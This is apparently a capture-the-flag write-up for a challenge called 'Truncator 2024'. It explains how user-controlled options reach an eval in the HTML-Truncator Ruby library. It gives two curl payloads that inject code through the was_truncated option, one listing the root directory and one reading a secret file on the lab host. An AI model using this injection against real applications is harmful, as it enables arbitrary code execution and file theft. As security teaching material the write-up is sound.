# Truncator 2024

The application allows the user to set options in the call to `HTML_Truncator.truncate`.
```ruby
  params[:options].each do |option, _|
    options.merge!(JSON.parse(option, symbolize_names: true))
  end

  @html = HTML_Truncator.truncate(html, options[:length].to_i, options)
```

The library evaluates one of the options to define a singleton method on the returned string: https://github.com/nono/HTML-Truncator/blob/245ba6fc17ff7e95611b10e157e3c5a3e8ad576c/lib/html_truncator.rb#L16

Since the injection point is in an instance method, you have to move out of that scope to have code that executes right away. A comment can be used to escape the rest of the code.

```sh
html="Dir['/*']"

curl 'http://truncator.local/truncate' \
  -d "html=$html" \
  -d 'length=30' \
  -d 'options[{"was_truncated":"true end end; return eval(str).to_s # "}]=on'
```

```sh
html="File.read Dir['/secret*'].first"

curl 'http://truncator.local/truncate' \
  -d "html=$html" \
  -d 'length=30' \
  -d 'options[{"was_truncated":"true end end; return eval(str).to_s # "}]=on'
```
